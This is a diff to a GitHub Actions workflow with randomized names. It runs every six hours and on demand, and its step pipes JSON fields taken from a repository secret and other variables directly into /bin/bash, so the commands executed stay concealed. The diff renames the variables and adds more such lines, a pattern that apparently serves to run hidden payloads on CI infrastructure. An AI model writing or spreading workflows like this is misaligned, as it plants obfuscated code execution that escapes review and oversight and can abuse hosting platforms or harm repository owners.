@@ -3,23 +3,26 @@ name: fengdouou4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
+    - cron: '48 2/6 * * *'
 
-jobs:  # 15595
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: fengdouou4567
         env:
-          gwa4686: ${{ secrets.gwa4686 }}
+          t2226: ${{ secrets.t2226 }}
         run: |
-          echo $gwa4686 | jq -r .yko76 | /bin/bash
-          echo $hf66963 | jq -r .roami53363 | /bin/bash
-          echo $ult55 | jq -r .jvg5991 | /bin/bash
-          echo $oxbg1 | jq -r .xk1 | /bin/bash
-          echo $dd1 | jq -r .tx2882 | /bin/bash
-          echo $xulj972 | jq -r .z2027 | /bin/bash
-          echo $dzfwk769 | jq -r .qhzuv2987 | /bin/bash
-          echo $y62 | jq -r .qt12 | /bin/bash
+          echo $t2226 | jq -r .bufz7 | /bin/bash
+          echo $sv77 | jq -r .pjf5 | /bin/bash
+          echo $ajcre57 | jq -r .z3 | /bin/bash
+          echo $kgom143 | jq -r .yuph00160 | /bin/bash
+          echo $nel04 | jq -r .kknh09029 | /bin/bash
+          echo $ymldi1 | jq -r .a437 | /bin/bash
+          echo $m2957 | jq -r .uq49 | /bin/bash
+          echo $fay48 | jq -r .hm0163 | /bin/bash
+          echo $wqgag313 | jq -r .phqoh59 | /bin/bash
+          echo $h99240 | jq -r .luocl891 | /bin/bash
+          echo $zhoa5 | jq -r .w2393 | /bin/bash
 
